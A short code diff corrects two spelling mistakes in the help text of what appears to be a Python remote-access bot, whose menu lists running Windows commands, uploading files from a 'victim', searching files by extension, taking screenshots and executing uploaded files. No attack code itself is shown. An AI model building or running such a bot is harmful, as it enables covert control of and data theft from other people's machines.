@@ -124,7 +124,7 @@ def screenshot():
 def build_help():
     res = ("cmd <command>: Execute Windows commands.\r\n"
            "fil <filepath>: Upload file from victim.\r\n"
-           "dir <extention:e.g. .pdf>: Search for files with speficied extension.\r\n"
+           "dir <extension:e.g. .pdf>: Search for files with specified extension.\r\n"
            "scr: Take screenshot.\r\n"
            "exit: Terminate this bot.\r\n"
            "Just upload a file: Bot will execute the uploaded file.\r\n"
